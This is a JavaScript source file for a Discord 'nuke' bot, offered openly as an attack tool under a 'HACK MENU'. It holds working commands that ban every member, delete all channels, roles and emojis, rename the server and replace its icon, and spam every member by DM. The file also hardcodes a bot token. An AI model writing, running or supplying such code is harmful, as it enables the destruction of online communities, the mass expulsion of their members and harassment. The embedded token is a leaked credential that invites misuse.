const { Client } = require("discord.js");

const Discord = require('discord.js');

const client = new Client({

});

const TOKEN = "NzYwOTYxNzMxNjg5MTg1MzMx.X3Tq1g.bqD5jIjnz_D_UB_zo0MxG0SCTeI"

const config = {

"prefix" : "$",

"dmMessage" : "**nuked bby**",

"serverName" : "NUKED SERVER",

"iconURL" : "https://i.insider.com/593af232bf76bb72038b4c7a?width=1100&format=jpeg&auto=png",

"banReason" : "banevasion",

}

 

client.on("ready", async () => {

console.log(`${client.user.username} is ready to nuke ;)\n Make sure you have written the config variable !!`)     

});

client.on("message", async(message)=>{

  if (!message.guild) return;

    if (message.content.startsWith(`${config.prefix}nuke`)) {      

      

   message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {

 message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.user.username}`)})

                                                                                     

})

   message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})

  })

    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{

      role.delete().then((e)=> {console.log(`DELETED ROLE: ${e.name}`)})

    })

   message.guild.emojis.cache.array().forEach(emoji => {emoji.delete().then((e)=> {console.log(`DELETED EMOJI: ${e.name}`)})

  })

   message.guild.setName(config.serverName)

   message.guild.setIcon(config.iconURL)

}

if (message.content.startsWith(`${config.prefix}dmall`)) {      

message.guild.members.cache.array().forEach(m => {m.send(config.dmMessage).then((m)=> {console.log(`MESSAGE SENT TO: ${m.user.username}`)})

})

}

if (message.content.startsWith(`${config.prefix}banall`)) {      

  message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {

    message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.name}`)})

                                                                                        

   })  

  }

  if(message.content.startsWith(`${config.prefix}deleteall`)){

    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{

      role.delete().then((r)=>{

        console.log(`DELETED ROLE: ${r.name}`)

      })

    })

        message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})

        

      })

    }

  if(message.content.startsWith(`${config.prefix}ping`)){

    		         message.channel.send('Ping?').then(m => m.edit(`${m.createdTimestamp - message.createdTimestamp}ms`))

  }

    if(message.content.startsWith(`${config.prefix}help`)) {

     let p = config.prefix

     let embed = new Discord.MessageEmbed()

    .setTitle(`HACK MENU`)

    .addField(`${p}ping`,"See bot's response time ( it is good to be under 120ms ).")

    .addField(`${p}banall`,"Bans everyone.")

    .addField(`${p}deleteall`,"Deletes all roles and channels.")

    .addField(`${p}dmall`,"Messages everyone the dmMessage value.")

    .addField(`${p}nuke`,"Bans everyone, deletes all roles, channels and emojis & sets the name and server icon in which you want.")

    .setFooter('Remember that the bot is on the las discord.js version ** IT IS VERY FAST **.')

    message.member.send(embed)

      }

})

client.login(TOKEN)
